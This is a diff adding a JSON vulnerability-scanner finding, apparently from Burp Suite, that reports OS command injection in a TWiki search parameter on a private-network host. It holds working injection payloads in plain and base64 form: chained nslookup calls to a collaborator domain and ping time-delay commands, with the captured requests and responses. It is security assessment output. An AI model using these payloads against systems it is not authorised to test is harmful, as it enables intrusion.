@@ -1,0 +1,121 @@
+{
+  "name": "OS command injection",
+  "type": "vulnerability",
+  "severity": "High",
+  "confidence": "Certain",
+  "host": "",
+  "path": "/twiki/bin/search/Main/SearchResult",
+  "url": "/twiki/bin/search/Main/SearchResult",
+  "evidence": [
+    {
+      "type": "CollaboratorEvidence",
+      "detail": {
+        "payload": {
+          "bytes": "Jm5zbG9va3VwIC1xPWNuYW1lIGdleXA0dXVpZnRpYWRzNTVjNnZwMG52bHNjeTVwdG55YnR6a21hYXoub2FzdGlmeS5jb20uJidcImAwJm5zbG9va3VwIC1xPWNuYW1lIGdleXA0dXVpZnRpYWRzNTVjNnZwMG52bHNjeTVwdG55YnR6a21hYXoub2FzdGlmeS5jb20uJmAn",
+          "flags": 18
+        },
+        "band_flags": [
+          "out_of_band"
+        ]
+      },
+      "request_response": {
+        "url": "http://192.168.1.50/twiki/bin/search/Main/SearchResult?search=%26nslookup%20-q%3dcname%20geyp4uuiftiads55c6vp0nvlscy5ptnybtzkmaaz.oastify.com.%26'%5c%22%600%26nslookup%20-q%3dcname%20geyp4uuiftiads55c6vp0nvlscy5ptnybtzkmaaz.oastify.com.%26%60'",
+        "request": [
+          {
+            "type": "DataSegment",
+            "data": "R0VUIC90d2lraS9iaW4vc2VhcmNoL01haW4vU2VhcmNoUmVzdWx0P3NlYXJjaD0=",
+            "length": 47
+          },
+          {
+            "type": "HighlightSegment",
+            "data": "JTI2bnNsb29rdXAlMjAtcSUzZGNuYW1lJTIwZ2V5cDR1dWlmdGlhZHM1NWM2dnAwbnZsc2N5NXB0bnlidHprbWFhei5vYXN0aWZ5LmNvbS4lMjYnJTVjJTIyJTYwMCUyNm5zbG9va3VwJTIwLXElM2RjbmFtZSUyMGdleXA0dXVpZnRpYWRzNTVjNnZwMG52bHNjeTVwdG55YnR6a21hYXoub2FzdGlmeS5jb20uJTI2JTYwJw==",
+            "length": 181
+          },
+          {
+            "type": "DataSegment",
+            "data": "IEhUVFAvMS4xDQpIb3N0OiAxOTIuMTY4LjEuNTANCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KU2VjLUNILVVBOiAiR29vZ2xlIENocm9tZSI7dj0iMTM4IiwgIk5vdD1BP0JyYW5kIjt2PSI4IiwgIkNocm9taXVtIjt2PSIxMzgiDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KU2VjLUNILVVBLVBsYXRmb3JtOiAiTGludXgiDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzguMC4wLjAgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNClNlYy1GZXRjaC1TaXRlOiBub25lDQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1Vc2VyOiA/MQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpDb25uZWN0aW9uOiBjbG9zZQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cDovLzE5Mi4xNjguMS41MC90d2lraS9iaW4vdmlldy9NYWluL1dlYkhvbWUNCg0K",
+            "length": 723
+          }
+        ],
+        "response": [
+          {
+            "type": "DataSegment",
+            "data": "SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBUdWUsIDAyIFNlcCAyMDI1IDE2OjA4OjI3IEdNVA0KU2VydmVyOiBBcGFjaGUvMi4yLjggKFVidW50dSkgREFWLzINCkNvbm5lY3Rpb246IGNsb3NlDQpDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogMzA1MA0KDQo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIFhIVE1MIDEuMCBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIveGh0bWwxL0RURC94aHRtbDEtdHJhbnNpdGlvbmFsLmR0ZCI+CjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiB4bWw6bGFuZz0iZW4iIGxhbmc9ImVuIj4gCjxoZWFkPgogPA==",
+            "length": 379
+          },
+          {
+            "type": "SnipSegment",
+            "length": 2850
+          }
+        ],
+        "was_redirect_followed": false,
+        "request_time": "1756829308337"
+      },
+      "dns_event": {
+        "query_type": 5,
+        "domain": "geyp4uuiftiads55c6vp0nvlscy5ptnybtzkmaaz.oastify.com",
+        "query": "iGQAAAABAAAAAAAAKGdleXA0dXVpZnRpYWRzNTVjNnZwMG52bHNjeTVwdG55YnR6a21hYXoHb2FzdGlmeQNjb20AAAUAAQ==",
+        "time_stamp": "2025-Sep-02 16:08:27.807 UTC",
+        "time_between_sending_payload_and_receiving_interaction": "0",
+        "source_ip_address": "105.73.34.102",
+        "source_port": 56315,
+        "type": "dns",
+        "interaction_id": "geyp4uuiftiads55c6vp0nvlscy5ptnybtzkmaaz",
+        "description": "The Collaborator server received a DNS lookup of type CNAME for the domain name <b>geyp4uuiftiads55c6vp0nvlscy5ptnybtzkmaaz.oastify.com</b>.<br><br> The lookup was received from IP address 105.73.34.102:56315 at 2025-Sep-02 16:08:27.807 UTC."
+      }
+    },
+    {
+      "type": "TimingBasedEvidence",
+      "evidence": {
+        "type": "FirstOrderEvidence",
+        "detail": {
+          "payload": {
+            "bytes": "fHBpbmcgLW4gMjEgMTI3LjAuMC4xfHxgcGluZyAtYyAyMSAxMjcuMC4wLjFgICMnIHxwaW5nIC1uIDIxIDEyNy4wLjAuMXx8YHBpbmcgLWMgMjEgMTI3LjAuMC4xYCAjXCIgfHBpbmcgLW4gMjEgMTI3LjAuMC4x",
+            "flags": 17
+          },
+          "band_flags": [
+            "in_band"
+          ]
+        },
+        "request_response": {
+          "url": "http://192.168.1.50/twiki/bin/search/Main/SearchResult?scope=text&regex=on&search=Web%20*Home[%5eA-Za-z]%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1",
+          "request": [
+            {
+              "type": "DataSegment",
+              "data": "R0VUIC90d2lraS9iaW4vc2VhcmNoL01haW4vU2VhcmNoUmVzdWx0P3Njb3BlPXRleHQmcmVnZXg9b24mc2VhcmNoPVdlYiUyMCpIb21lWyU1ZUEtWmEtel0=",
+              "length": 89
+            },
+            {
+              "type": "HighlightSegment",
+              "data": "JTdjcGluZyUyMC1uJTIwMjElMjAxMjcuMC4wLjElN2MlN2MlNjBwaW5nJTIwLWMlMjAyMSUyMDEyNy4wLjAuMSU2MCUyMCUyMyclMjAlN2NwaW5nJTIwLW4lMjAyMSUyMDEyNy4wLjAuMSU3YyU3YyU2MHBpbmclMjAtYyUyMDIxJTIwMTI3LjAuMC4xJTYwJTIwJTIzJTVjJTIyJTIwJTdjcGluZyUyMC1uJTIwMjElMjAxMjcuMC4wLjE=",
+              "length": 188
+            },
+            {
+              "type": "DataSegment",
+              "data": "IEhUVFAvMS4xDQpIb3N0OiAxOTIuMTY4LjEuNTANCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KU2VjLUNILVVBOiAiR29vZ2xlIENocm9tZSI7dj0iMTM4IiwgIk5vdD1BP0JyYW5kIjt2PSI4IiwgIkNocm9taXVtIjt2PSIxMzgiDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KU2VjLUNILVVBLVBsYXRmb3JtOiAiTGludXgiDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzguMC4wLjAgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNClNlYy1GZXRjaC1TaXRlOiBub25lDQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1Vc2VyOiA/MQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpDb25uZWN0aW9uOiBjbG9zZQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cDovLzE5Mi4xNjguMS41MC90d2lraS9iaW4vdmlldy9NYWluL1dlYkhvbWUNCkNvbnRlbnQtTGVuZ3RoOiAwDQoNCg==",
+              "length": 742
+            }
+          ],
+          "response": [
+            {
+              "type": "DataSegment",
+              "data": "SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBUdWUsIDAyIFNlcCAyMDI1IDE0OjE5OjU2IEdNVA0KU2VydmVyOiBBcGFjaGUvMi4yLjggKFVidW50dSkgREFWLzINCkNvbm5lY3Rpb246IGNsb3NlDQpDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogMzAxOQ0KDQo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIFhIVE1MIDEuMCBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIveGh0bWwxL0RURC94aHRtbDEtdHJhbnNpdGlvbmFsLmR0ZCI+CjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiB4bWw6bGFuZz0iZW4iIGxhbmc9ImVuIj4gCjxoZWFkPgogPA==",
+              "length": 379
+            },
+            {
+              "type": "SnipSegment",
+              "length": 2819
+            }
+          ],
+          "was_redirect_followed": false,
+          "request_time": "1756822887399"
+        }
+      },
+      "orig_response_completed_timer": "459",
+      "attack_response_completed_timer": "20413"
+    }
+  ],
+  "description": "The <b>search</b> parameter appears to be vulnerable to OS command injection attacks. It is possible to use various shell metacharacters to inject arbitrary OS commands. The command output does not appear to be returned in the application's responses, however it is possible to inject time delay commands to verify the existence of the vulnerability. It is also possible to cause the application to interact with an external domain, to verify that a command was executed.<br><br>The payload <b>&amp;nslookup -q=cname geyp4uuiftiads55c6vp0nvlscy5ptnybtzkmaaz.oastify.com.&amp;'\\\"`0&amp;nslookup -q=cname geyp4uuiftiads55c6vp0nvlscy5ptnybtzkmaaz.oastify.com.&amp;`'</b> was submitted in the search parameter. The application performed a DNS lookup for the specified domain name.<br><br>Additionally, the payload <b>|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\\\" |ping -n 21 127.0.0.1</b> was submitted in the search parameter. The application took <b>20413</b> milliseconds to respond to the request, compared with <b>459</b> milliseconds for the original request, indicating that the injected command caused a time delay.",
+  "remediation": "",
+  "references": []
+}
